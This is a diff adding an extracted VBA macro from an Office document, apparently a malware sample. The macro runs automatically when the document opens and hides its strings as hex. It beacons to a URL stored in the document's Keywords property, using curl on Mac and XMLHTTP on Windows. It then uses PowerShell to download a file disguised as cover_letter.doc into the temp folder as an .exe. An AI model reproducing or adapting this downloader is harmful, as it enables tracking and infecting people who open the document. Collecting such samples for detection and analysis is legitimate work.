@@ -1,0 +1,47 @@
+Filename     : ./macros/79d49e4d14e54b8bd1bc4b8466d402652d17729ea42b46d8acc05eb28bc1d3c4
+OLE stream   : VBA/ThisDocument
+VBA filename : ThisDocument.cls
+----------------------------------------
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Const bkhnynxekh = 2
+Const acadajmdvl = 1
+Const xmzbfwxuhb = 0
+#If Mac Then
+Private Declare Function glbepqqkqonvfpefu Lib "libc.dylib" Alias "system" (ByVal byxtjkbksdhrgguheu As String) As Long
+#End If
+Sub Auto_Open()
+Dim pwykfvrrkynej As Object
+Set pwykfvrrkynej = ActiveDocument.BuiltInDocumentProperties
+tracker = pwykfvrrkynej(ylkhmjklpudf("4b") & ylkhmjklpudf("6579576f726473"))
+#If Mac Then
+glbepqqkqonvfpefu (ylkhmjklpudf("637572") & ylkhmjklpudf("6c20") + tracker)
+#Else
+Dim req: Set atmkzingpzfi = CreateObject(ylkhmjklpudf("4d69") & ylkhmjklpudf("63726f736f66742e584d4c48545450"))
+atmkzingpzfi.Open ylkhmjklpudf("474554"), tracker, False
+atmkzingpzfi.Send
+#End If
+#If Windows Then
+Dim powershellCommands
+powershellCommands = Shell(ylkhmjklpudf("706f77657273") & ylkhmjklpudf("68656c6c20496e766f6b652d57656252657175657374202d55726920687474703a2f2f31302e31322e32302e3230333a383030302f636f7665725f6c65747465722e646f63202d4f757446696c652024456e763a74656d705c6668627a656b65742e6578653b2065786974"), xmzbfwxuhb)
+#End If
+End Sub
+Sub AutoOpen()
+Auto_Open
+End Sub
+Sub Workbook_Open()
+Auto_Open
+End Sub
+Private Function ylkhmjklpudf(ByVal jscvwlblgvhl As String) As String
+Dim lezyslpbynro As Long
+For lezyslpbynro = 1 To Len(jscvwlblgvhl) Step 2
+ylkhmjklpudf = ylkhmjklpudf & Chr$(Val("&H" & Mid$(jscvwlblgvhl, lezyslpbynro, 2)))
+Next lezyslpbynro
+End Function
+
